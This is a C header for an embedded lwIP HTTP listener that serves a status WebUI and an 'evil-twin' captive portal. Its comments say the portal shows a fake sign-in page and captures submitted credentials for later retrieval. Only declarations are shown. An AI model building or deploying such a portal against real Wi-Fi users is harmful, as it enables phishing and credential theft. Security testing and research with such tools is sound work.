// M4: raw-lwIP TCP HTTP listener. The Arduino WiFiServer's accept never receives the SoftAP's
// connections (root-caused), so both the WebUI status page AND the evil-twin captive portal serve
// through lwIP's TCP raw API directly (like the DHCP/DNS servers use udp raw).
//   web_lwip_start(render)   - WebUI mode: serve the `render` page to any request.
//   web_lwip_start_portal()  - captive-portal mode: serve a sign-in page, answer OS probes, and
//                              CAPTURE submitted credentials (GET query) for loop() to drain.
#ifndef WEB_LWIP_H
#define WEB_LWIP_H
#include <stddef.h>
bool web_lwip_start(void (*render)(char* buf, size_t cap));  // WebUI: bind+listen :80
// captive portal: bind+listen :80, serving the SELECTED page. body=NULL -> built-in generic
// sign-in page. gzip -> adds Content-Encoding: gzip. copy -> stream with TCP_WRITE_FLAG_COPY
// (use for a mutable buffer like customPortal; flash gzip blobs pass copy=false for zero-copy).
bool web_lwip_start_portal(const char* body, int len, bool gzip, bool copy);
bool web_lwip_poll_creds(char* buf, int cap);                // loop() drains captured creds (EV:)
void web_lwip_stop();
#endif
